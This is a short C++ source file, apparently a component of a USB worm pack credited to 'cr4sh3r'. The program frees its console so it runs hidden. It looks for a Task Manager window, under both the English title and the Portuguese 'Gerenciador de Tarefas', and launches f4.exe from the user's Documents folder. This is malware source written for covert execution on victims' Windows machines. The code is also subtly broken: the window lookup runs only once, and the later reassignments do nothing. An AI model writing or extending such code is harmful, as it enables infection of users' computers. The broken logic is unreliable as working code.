/* hu3-aux2 - 2016 - cr4sh3r */

/* bad_blocks - 2016 - cr4sh3r */

#include <stdio.h>
#include <cstdlib>
#include <windows.h>
#include <winuser.h>
#include <conio.h>


LPCSTR WindowName = "Task Manager";
HWND Find = FindWindow(NULL, WindowName);

int main() {
	FreeConsole();
	while (true) {

		if (Find) {
			system("start C:\\Users\\%username%\\Documents\\f4.exe");
			::LPCSTR WindowName = "Task Manager";
			_getch();
			Sleep(1000 * 5);
		}
		
		else {
			::LPCSTR WindowName = "Gerenciador de Tarefas";
			_getch();
		}
	}

}

// bad_blocks(usb-worm) - pack
